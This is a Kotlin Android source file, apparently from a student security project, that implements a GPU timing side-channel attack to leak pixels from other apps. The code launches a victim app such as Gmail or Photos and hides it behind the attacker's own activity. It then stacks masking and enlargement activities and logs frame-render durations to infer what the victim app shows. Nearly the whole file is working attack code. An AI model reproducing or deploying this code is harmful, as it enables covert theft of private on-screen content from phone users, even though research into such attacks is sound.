package com.example.inf2007_mad_j1847.view.attack

import android.content.Intent
import android.util.Log
import android.view.Choreographer
import android.widget.Toast
import androidx.compose.foundation.layout.*
import androidx.compose.material3.Button
import androidx.compose.material3.Text
import androidx.compose.runtime.Composable
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.unit.dp
import androidx.navigation.NavHostController
import com.example.inf2007_mad_j1847.MainActivity

// --- PHASE 3: SIDE-CHANNEL DATA EXTRACTION ---

// A variable at the file level to hold our frame callback listener.
// This allows us to access it from both the start and stop buttons.
private var frameCallback: Choreographer.FrameCallback? = null
// Stores the timestamp of the last frame to calculate the duration.
private var lastFrameTimeNanos = 0L

@Composable
fun GpuAttackScreen(navController: NavHostController) {
    // Get the context
    val context = LocalContext.current

    Column(
        modifier = Modifier.fillMaxSize().padding(16.dp),
        horizontalAlignment = Alignment.CenterHorizontally,
        verticalArrangement = Arrangement.Center
    ) {
        Text("GPU Side-Channel Attack Test")
        Spacer(modifier = Modifier.height(16.dp))
        Button(onClick = {
            // --- PHASE 1: TARGET IDENTIFICATION ---
            val targetPackages = listOf(
                // Core Apps (very likely to be present)
                "com.android.vending",              // Google Play Store
                "com.android.chrome",               // Google Chrome
                "com.google.android.gm",            // Gmail
                "com.google.android.apps.maps",     // Google Maps
                "com.google.android.youtube",       // YouTube

                // Standard Utility Apps (might be disabled/uninstalled)
                "com.google.android.calculator",
                "com.google.android.deskclock",
                "com.google.android.apps.messaging",// Google Messages
                "com.google.android.apps.photos"     // Google Photos
            )

            val packageManager = context.packageManager
            var foundAndLaunched = false

            for (packageName in targetPackages) {
                val launchIntent = packageManager.getLaunchIntentForPackage(packageName)

                if (launchIntent != null) {
                    // If app is found, launch it (the "victim")
                    launchIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    context.startActivity(launchIntent)

                    // Immediately bring our app back to the foreground to hide the victim
                    val bringToFrontIntent = Intent(context, MainActivity::class.java).apply {
                        addFlags(Intent.FLAG_ACTIVITY_REORDER_TO_FRONT or Intent.FLAG_ACTIVITY_NEW_TASK)
                    }
                    context.startActivity(bringToFrontIntent)


                    // --- PHASE 2: ACTIVITY STACK ---

                    // Launch the MaskingActivity (the 1x1 pixel hole)
                    val maskingIntent = Intent(context, MaskingActivity::class.java).apply {
                        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    }
                    context.startActivity(maskingIntent)

                    // Launch the EnlargementActivity (the blur/stretch layer)
                    val enlargementIntent = Intent(context, EnlargementActivity::class.java).apply {
                        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    }
                    context.startActivity(enlargementIntent)

                    Toast.makeText(context, "Launched $packageName and returned", Toast.LENGTH_SHORT).show()
                    foundAndLaunched = true
                    
                    // --- PHASE 3 (Continued): START MEASUREMENT ---
                    // Check if the callback is not already running
                    if (frameCallback == null) {
                        lastFrameTimeNanos = 0L // Reset timer on each new attack
                        frameCallback = Choreographer.FrameCallback { frameTimeNanos ->
                            // Ensure we have a previous frame time to compare against
                            if (lastFrameTimeNanos != 0L) {
                                // Calculate the duration in milliseconds
                                val frameDurationMillis = (frameTimeNanos - lastFrameTimeNanos) / 1_000_000f
                                // Log the time difference. This is the core of the side-channel.
                                // A high duration means a complex pixel was rendered.
                                // A low duration means a simple pixel (like a solid color) was rendered.
                                Log.d("GpuAttack", "Frame Duration: %.2f ms".format(frameDurationMillis))
                            }
                            lastFrameTimeNanos = frameTimeNanos
                            // IMPORTANT: Re-register the callback to listen for the next frame.
                            Choreographer.getInstance().postFrameCallback(frameCallback!!)
                        }
                        // Start listening for frame updates.
                        Choreographer.getInstance().postFrameCallback(frameCallback!!)
                        Toast.makeText(context, "Started timing measurement", Toast.LENGTH_SHORT).show()
                    }

                    break // Exit loop once a target is launched
                }
            }

            if (!foundAndLaunched) {
                Toast.makeText(context, "No target apps found!", Toast.LENGTH_SHORT).show()
            }
        }) {
            Text("Launch Attack")
        }
        
        // Add a button to stop the measurement gracefully
        Spacer(modifier = Modifier.height(8.dp))
        Button(onClick = {
            // If the callback is running, remove it
            frameCallback?.let {
                Choreographer.getInstance().removeFrameCallback(it)
                frameCallback = null // Set to null so we know it's stopped
                Toast.makeText(context, "Stopped timing measurement", Toast.LENGTH_SHORT).show()
                Log.d("GpuAttack", "--- Measurement Stopped ---")
            }
        }) {
            Text("Stop Measurement")
        }
    }
}
